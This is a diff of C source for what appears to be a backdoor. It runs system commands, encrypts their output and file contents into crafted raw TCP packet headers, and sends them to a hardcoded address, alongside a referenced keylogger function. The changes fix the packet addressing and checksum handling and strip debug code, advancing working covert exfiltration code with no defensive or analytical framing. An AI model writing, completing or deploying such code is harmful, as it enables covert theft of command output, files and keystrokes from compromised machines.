@@ -3,25 +3,23 @@
 static void processFile(char *filePath, int socket, char *buffer, struct sockaddr_in *sin);
 static void whoAmI(char *buffer);
 static int createRawTcpSocket();
-static char *createRawTcpPacket(struct sockaddr_in *sin);
+static char *createRawTcpPacket(struct sockaddr_in *din);
 
 void executeSystemCall(char *command)
 {
     int socket = 0;
     int bytesRead = 0;
-    int count = 0;
     char line[4];
     char date[11];
     char *buffer = NULL;
     char *encryptedField = NULL;
     struct tm *timeStruct = NULL;
-    struct sockaddr_in sin;
+    struct sockaddr_in din;
     time_t t;
     unsigned short sum = 0;
     const unsigned short zero = 0;
     FILE *results = NULL;
 
-	int z = -1;
     // Execute and open the pipe for reading
     results = popen(command, "r");
     
@@ -48,7 +46,7 @@ void executeSystemCall(char *command)
     strftime(date, sizeof(date), "%Y:%m:%d", timeStruct);
     
     // Create the packet structure
-    buffer = createRawTcpPacket(&sin);
+    buffer = createRawTcpPacket(&din);
     
     // Read from the stream
     while ((bytesRead = fread(line, sizeof(char), 4, results)) > 0)
@@ -62,11 +60,8 @@ void executeSystemCall(char *command)
         sum = csum((unsigned short *)buffer, 5);
         memcpy(buffer + 10, &sum, sizeof(unsigned short));
 
-		getsockopt(socket, IPPROTO_IP, IP_HDRINCL, &z, &count);
-		fprintf(stderr, "is it set: %d\n", z);
-
         sendto(socket, buffer, sizeof(struct ip) + sizeof(struct tcphdr), 0,
-               (struct sockaddr *)&sin, sizeof(sin));
+               (struct sockaddr *)&din, sizeof(din));
     }
     
     // Send a FIN packet to signal end of transfer
@@ -144,6 +139,7 @@ void keylogger()
 static void processFile(char *filePath, int socket, char *buffer, struct sockaddr_in *sin)
 {
     int bytesRead = 0;
+    int zero = 0;
     char line[4];
     char date[11];
     char *encryptedField = NULL;
@@ -172,6 +168,7 @@ static void processFile(char *filePath, int socket, char *buffer, struct sockadd
         memcpy(buffer + sizeof(struct ip) + 4, encryptedField, sizeof(unsigned long));
         
         // Get the checksum for the IP packet
+        memcpy(buffer + 10, &zero, sizeof(unsigned short));
         sum = csum((unsigned short *)buffer, 5);
         memcpy(buffer + 10, &sum, sizeof(unsigned short));
         
@@ -180,13 +177,13 @@ static void processFile(char *filePath, int socket, char *buffer, struct sockadd
     }
 }
 
-char *createRawTcpPacket(struct sockaddr_in *sin)
+char *createRawTcpPacket(struct sockaddr_in *din)
 {
     char *buffer = NULL;
     char *myAddr = NULL;
     struct ip *iph = NULL;
     struct tcphdr *tcph = NULL;
-    struct sockaddr_in din;
+    struct sockaddr_in sin;
     
     buffer = malloc(sizeof(struct ip) + sizeof(struct tcphdr));
     myAddr = malloc(sizeof(struct in_addr));
@@ -194,14 +191,14 @@ char *createRawTcpPacket(struct sockaddr_in *sin)
     tcph = (struct tcphdr *) (buffer + sizeof(struct ip));
     
     // Fill out the address structs
-    sin->sin_family = AF_INET;
-    din.sin_family = AF_INET;
-    sin->sin_port = htons(SOURCE_PORT_INT);
-    din.sin_port = htons(SOURCE_PORT_INT);
+    sin.sin_family = AF_INET;
+    din->sin_family = AF_INET;
+    sin.sin_port = htons(SOURCE_PORT_INT);
+    din->sin_port = htons(SOURCE_PORT_INT);
     whoAmI(myAddr);
     //sin->sin_addr.s_addr = inet_addr(myAddr);
-    sin->sin_addr.s_addr = inet_addr("192.168.0.180");
-    din.sin_addr.s_addr = inet_addr("192.168.0.190");
+    sin.sin_addr.s_addr = inet_addr("192.168.0.180");
+    din->sin_addr.s_addr = inet_addr("192.168.0.190");
     
     // Zero out the buffer
     memset(buffer, 0, sizeof(struct ip) + sizeof(struct tcphdr));
@@ -217,8 +214,8 @@ char *createRawTcpPacket(struct sockaddr_in *sin)
     iph->ip_ttl = 64;
     iph->ip_p = 6;
     iph->ip_sum = 0;
-    iph->ip_src = sin->sin_addr;
-    iph->ip_dst = din.sin_addr;
+    iph->ip_src = sin.sin_addr;
+    iph->ip_dst = din->sin_addr;
 #else
     iph->ihl = 5;
     iph->version = 4;
@@ -229,8 +226,8 @@ char *createRawTcpPacket(struct sockaddr_in *sin)
     iph->ttl = 64;
     iph->protocol = 6;
     iph->check = 0;
-    iph->saddr = sin->sin_addr;
-    iph->daddr = din.sin_addr;
+    iph->saddr = sin.sin_addr;
+    iph->daddr = din->sin_addr;
 #endif
     
     // TCP structure
@@ -288,7 +285,6 @@ static int createRawTcpSocket()
 {
     int sock = 0;
     int one = 1;
-    struct ifreq ifr;
     
     // Create the raw TCP socket
     sock = socket(PF_INET, SOCK_RAW, IPPROTO_TCP);
@@ -303,13 +299,5 @@ static int createRawTcpSocket()
         systemFatal("Error setting socket options");
     }
     
-    // Bind to the correct device
-    memset(&ifr, 0, sizeof(ifr));
-    snprintf(ifr.ifr_name, sizeof(ifr.ifr_name), "wlan0");
-    if (setsockopt(sock, SOL_SOCKET, SO_BINDTODEVICE, &ifr, sizeof(ifr)) == -1)
-    {
-		systemFatal("Error binding to default device");
-	}
-
     return sock;
 }
